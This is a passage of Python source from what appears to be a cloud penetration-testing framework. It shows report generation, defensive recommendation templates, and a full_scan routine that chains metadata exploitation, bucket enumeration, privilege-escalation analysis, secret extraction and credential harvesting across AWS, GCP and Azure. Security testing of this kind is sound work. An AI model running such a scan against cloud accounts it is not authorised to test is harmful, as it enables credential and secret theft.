            elif risk_percentage >= 40:
                risk_rating = "MEDIUM"

            report = {
                "report_id": uuid.uuid4().hex[:16],
                "generated_at": time.time(),
                "scan_duration": self._scan_end_time - self._scan_start_time if self._scan_end_time else 0,
                "detected_provider": self._detected_provider.name if self._detected_provider else "UNKNOWN",
                "summary": {
                    "total_findings": len(unique_findings),
                    "exploitable_findings": len(exploitable),
                    "total_credentials": len(self._all_credentials),
                    "risk_score": risk_percentage,
                    "risk_rating": risk_rating,
                },
                "severity_breakdown": dict(severity_counts),
                "category_breakdown": dict(category_counts),
                "provider_breakdown": dict(provider_counts),
                "findings": [f.to_dict() for f in unique_findings],
                "credentials": [c.to_dict() for c in self._all_credentials],
                "scan_phases": self._scan_phases,
                "top_recommendations": self._generate_recommendations(unique_findings),
                "sub_engine_reports": {
                    "metadata_exploiter": self._metadata_exploiter.to_dict(),
                    "bucket_scanner": self._bucket_scanner.to_dict(),
                    "aws_exploiter": self._aws_exploiter.to_dict(),
                    "gcp_exploiter": self._gcp_exploiter.to_dict(),
                    "azure_exploiter": self._azure_exploiter.to_dict(),
                    "privesc_chain": self._privesc_chain.to_dict(),
                    "iam_analyzer": self._iam_analyzer.to_dict(),
                    "credential_harvester": self._cred_harvester.to_dict(),
                },
            }

            logger.info(
                "Report generated: %d findings, risk=%s (%d%%)",
                len(unique_findings), risk_rating, risk_percentage,
            )
            return report

    def _generate_recommendations(
        self, findings: List[CloudFinding]
    ) -> List[Dict[str, str]]:
        """Generate top security recommendations based on findings."""
        recommendations: List[Dict[str, str]] = []
        seen_topics: Set[str] = set()

        # Priority-ordered recommendation templates
        rec_templates = [
            {
                "condition": lambda f: f.category == AttackCategory.METADATA_EXPLOITATION and f.severity == Severity.CRITICAL,
                "topic": "imds_v2",
                "title": "Enforce IMDSv2 on All Instances",
                "description": "Require IMDSv2 token-based access to prevent SSRF-based credential theft.",
                "priority": "critical",
            },
            {
                "condition": lambda f: f.category == AttackCategory.CREDENTIAL_HARVESTING,
                "topic": "credential_management",
                "title": "Eliminate Hardcoded Credentials",
                "description": "Use IAM roles, managed identities, and secrets managers instead of hardcoded credentials.",
                "priority": "critical",
            },
            {
                "condition": lambda f: f.category == AttackCategory.IAM_PRIVILEGE_ESCALATION,
                "topic": "least_privilege",
                "title": "Implement Least Privilege IAM",
                "description": "Review and restrict IAM permissions. Remove unused privileges and wildcard actions.",
                "priority": "high",
            },
            {
                "condition": lambda f: f.category == AttackCategory.STORAGE_ENUMERATION and f.severity in (Severity.CRITICAL, Severity.HIGH),
                "topic": "storage_security",
                "title": "Secure Cloud Storage",
                "description": "Disable public access on all buckets. Enable encryption, logging, and versioning.",
                "priority": "high",
            },
            {
                "condition": lambda f: f.category == AttackCategory.SECRETS_EXTRACTION,
                "topic": "secrets_management",
                "title": "Use Dedicated Secrets Management",
                "description": "Store all secrets in AWS Secrets Manager, GCP Secret Manager, or Azure Key Vault.",
                "priority": "high",
            },
            {
                "condition": lambda f: f.category == AttackCategory.CROSS_ACCOUNT_PIVOT,
                "topic": "cross_account",
                "title": "Review Cross-Account Trust Policies",
                "description": "Audit all cross-account role trust policies. Add ExternalId conditions.",
                "priority": "medium",
            },
            {
                "condition": lambda f: f.category == AttackCategory.IDENTITY_IMPERSONATION,
                "topic": "sa_impersonation",
                "title": "Restrict Service Account Impersonation",
                "description": "Limit iam.serviceAccounts.getAccessToken and Token Creator role assignments.",
                "priority": "medium",
            },
            {
                "condition": lambda f: f.category == AttackCategory.KEY_VAULT_ACCESS,
                "topic": "keyvault",
                "title": "Harden Key Vault Access",
                "description": "Use RBAC for Key Vault. Enable audit logging. Review access policies regularly.",
                "priority": "high",
            },
        ]

        for template in rec_templates:
            if any(template["condition"](f) for f in findings):
                if template["topic"] not in seen_topics:
                    seen_topics.add(template["topic"])
                    recommendations.append({
                        "title": template["title"],
                        "description": template["description"],
                        "priority": template["priority"],
                    })

        return recommendations

    def full_scan(
        self,
        target: str = "",
        permissions: Optional[List[str]] = None,
        custom_words: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Execute a full automated cloud security scan.

        Runs all phases: detection, metadata, storage, privesc, secrets.
        """
        with self._lock:
            self._scan_start_time = time.time()
            logger.info("Starting full cloud scan for target: %s", target or "auto-detect")

            # Phase 1: Provider detection
            provider = self.detect_cloud_provider()

            # Phase 2: Metadata scanning
            metadata_results = self.scan_metadata()

            # Phase 3: Storage enumeration
            storage_results = {}
            if target:
                storage_results = self.enumerate_storage(
                    target, provider=provider, custom_words=custom_words
                )

            # Phase 4: Privilege escalation analysis
            privesc_results = self.find_privesc_paths(
                current_permissions=permissions, provider=provider
            )

            # Phase 5: Secret extraction
            secret_results = self.extract_secrets()

            self._scan_end_time = time.time()

            # Phase 6: Report generation
            report = self.generate_report()
            report["scan_results"] = {
                "metadata": metadata_results,
                "storage": storage_results,
                "privesc": privesc_results,
                "secrets": secret_results,
            }

            duration = self._scan_end_time - self._scan_start_time
            logger.info(
                "Full scan complete in %.2fs: %d findings, risk=%s",
                duration,
                report["summary"]["total_findings"],
                report["summary"]["risk_rating"],
            )
            return report

    def get_all_findings(self) -> List[CloudFinding]:
        """Return all findings from all engines."""
        with self._lock:
            return list(self._all_findings)

    def get_all_credentials(self) -> List[CloudCredential]:
        """Return all discovered credentials."""
        with self._lock:
            return list(self._all_credentials)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize attacker state."""
        with self._lock:
            return {
                "detected_provider": self._detected_provider.name if self._detected_provider else None,
                "total_findings": len(self._all_findings),
                "total_credentials": len(self._all_credentials),
                "scan_phases": self._scan_phases,
                "engines": {
                    "metadata_exploiter": self._metadata_exploiter.to_dict(),
                    "bucket_scanner": self._bucket_scanner.to_dict(),
                    "aws_exploiter": self._aws_exploiter.to_dict(),
                    "gcp_exploiter": self._gcp_exploiter.to_dict(),
                    "azure_exploiter": self._azure_exploiter.to_dict(),
                    "privesc_chain": self._privesc_chain.to_dict(),
                    "iam_analyzer": self._iam_analyzer.to_dict(),
                    "credential_harvester": self._cred_harvester.to_dict(),
                },
            }
